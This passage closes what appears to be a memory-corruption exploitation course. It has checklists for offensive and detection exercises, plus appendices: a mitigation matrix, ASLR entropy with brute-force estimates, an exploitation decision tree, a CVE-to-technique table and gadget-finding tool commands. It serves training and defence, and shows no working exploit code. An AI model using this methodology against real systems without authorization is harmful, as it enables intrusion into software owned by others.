- [ ] Exercise 2: ROP chain calls mprotect, shellcode executes on stack
- [ ] Exercise 3: All 7 canary bytes recovered, correct value confirmed
- [ ] Exercise 4A: GOT overwrite redirects puts() to win()/system()
- [ ] Exercise 4B: FSOP concept demonstrated with heap leak + tcache poison
- [ ] Exercise 5: Safe-linking decoded, arbitrary address allocation achieved
- [ ] Exercise 6: Prefetch timing identifies kernel base (without KPTI)
- [ ] Exercise 7: JIT spray encoding shows hidden instruction streams
- [ ] Exercise 8: Full chain (leak → canary → ret2libc) works against hardened binary

### Part B Verification

- [ ] Sigma rules detect mprotect(RWX) in audit logs
- [ ] Sigma rules detect canary brute-force crash patterns
- [ ] YARA rules match ROP chain patterns in memory dumps
- [ ] eBPF detector fires on W+X mprotect from non-JIT process
- [ ] Auditd rules capture relevant syscalls
- [ ] Hardening auditor correctly scores lab binaries

### Part C Verification

- [ ] MitigationBypassAnalyzer produces correct profile for all lab binaries
- [ ] DEPBypassBuilder generates valid ROP chains (verified in gdb)
- [ ] CanaryOracle successfully brute-forces canary against fork server
- [ ] RELROTargetFinder identifies version-appropriate targets
- [ ] Full toolkit runs without errors on bypass-dev VM

---

## Appendix A: Mitigation Interaction Matrix

| Attack Technique | ASLR | DEP/NX | Canary | Full RELRO | CFI | Shadow Stack | PAC | MTE |
|-----------------|------|--------|--------|-----------|-----|-------------|-----|-----|
| Stack overflow → RIP | — | — | **YES** | — | — | **YES** | **YES** | — |
| Heap UAF → vtable | — | — | — | — | **YES** | — | **YES** | **YES** |
| Format string read | — | — | — | — | — | — | — | — |
| Format string write | — | — | — | **YES** (GOT) | — | — | — | — |
| ROP chain | **YES** | — | **YES** | — | — | **YES** | — | — |
| JOP chain | **YES** | — | — | — | **YES** (IBT) | — | — | — |
| ret2libc | **YES** | — | **YES** | — | **YES** | **YES** | — | — |
| JIT spray | **YES** | — | — | — | — | — | — | — |
| Shellcode | **YES** | **YES** | **YES** | — | — | **YES** | — | — |
| FSOP | — | — | — | — | — | — | — | — |
| SROP | **YES** | — | — | — | — | **YES** | — | — |

**Legend:** YES = mitigation provides meaningful resistance; — = no protection

---

## Appendix B: ASLR Entropy Reference

| Region | x86_64 Linux | Windows x64 | macOS arm64 | Android arm64 |
|--------|-------------|-------------|-------------|---------------|
| Stack | 22 bits | 17 bits | ~24 bits | ~24 bits |
| mmap/Libraries | 28 bits | 17-19 bits | ~24 bits | ~24 bits |
| Heap (brk) | **13 bits** | 8 bits | Unknown | Scudo-managed |
| PIE binary | 28 bits | 17-19 bits | ~24 bits | ~24 bits |
| Kernel text | **9 bits** | ~25 bits | Unknown | ~16 bits |

**Critical weaknesses:** Linux heap (13 bits = 8192 positions, brute-forceable in ~82 seconds at 100 attempts/sec) and kernel text (9 bits = 512 positions, scannable in ~50ms via prefetch).

---

## Appendix C: Exploitation Decision Tree

```
START: Have vulnerability primitive
  │
  ├── Stack overflow?
  │   ├── Canary present?
  │   │   ├── YES → Need canary bypass first
  │   │   │   ├── Format string available? → Leak canary (Ex.1/3b)
  │   │   │   ├── Fork server? → Brute-force (Ex.3)
  │   │   │   └── Neither → Look for alternative primitive
  │   │   └── NO → Direct overflow to return address
  │   │
  │   └── After canary bypass, DEP present?
  │       ├── YES → Need code-reuse technique
  │       │   ├── ASLR active? → Need info leak first (Ex.1)
  │       │   ├── Gadgets available? → ROP chain (Ex.2)
  │       │   ├── Minimal gadgets? → SROP (Ex.2 alt)
  │       │   └── seccomp blocks mprotect? → ret2libc only
  │       └── NO → Direct shellcode injection
  │
  ├── Heap corruption (UAF/overflow)?
  │   ├── RELRO level?
  │   │   ├── None/Partial → GOT overwrite (Ex.4A)
  │   │   └── Full → FSOP, exit_funcs, tcache poison (Ex.4B, Ex.5)
  │   │
  │   ├── glibc version?
  │   │   ├── < 2.32 → No safe-linking, simple tcache poison
  │   │   ├── 2.32-2.33 → Safe-linking + hooks available
  │   │   └── ≥ 2.34 → Safe-linking, no hooks, need FSOP (Ex.5)
  │   │
  │   └── Need libc leak → Unsorted bin fd/bk (Ex.5 Phase 2)
  │
  └── CFI active?
      ├── Coarse (CFG/IBT) → Many valid targets, COOP viable (Ex.6)
      ├── Fine (cfi-vcall) → Need same-hierarchy method with useful effect
      └── Hardware (PAC) → Need signing oracle or PACMAN-class attack
```

---

## Appendix D: CVE Reference Table

| CVE | Technique Demonstrated | Relevant Section |
|-----|----------------------|-----------------|
| CVE-2018-6789 | Partial pointer overwrite (Exim) | §1.1 |
| CVE-2021-3156 | Heap metadata leak (Sudo) | §1.2 |
| CVE-2016-0728 | Vsyscall gadget bootstrapping | §1.4 |
| CVE-2022-4543 | EntryBleed KASLR bypass | §6.2 |
| CVE-2021-22555 | eBPF + Netfilter combo exploit | §6.3 |
| CVE-2009-0075 | SEH overwrite bypassing canary (IE7) | §3.3 |
| CVE-2017-7308 | KASLR bypass + kernel exploitation | §6.1 |

---

## Appendix E: Quick Reference — Exploitation Tooling

| Tool | Purpose | Key Command |
|------|---------|-------------|
| checksec | Binary mitigation status | `checksec --file=./binary` |
| ROPgadget | Find ROP gadgets | `ROPgadget --binary ./binary --ropchain` |
| one_gadget | Find execve one-shot gadgets in libc | `one_gadget /path/to/libc.so.6` |
| pwntools | Exploit development framework | `from pwn import *` |
| pwndbg | GDB plugin for exploitation | `gdb -q ./binary` |
| seccomp-tools | Dump seccomp filter | `seccomp-tools dump ./binary` |
| ropper | Alternative gadget finder | `ropper --file ./binary --search "pop rdi"` |
| LibcSearcher | Identify libc version from leak | `LibcSearcher('puts', leaked_addr)` |
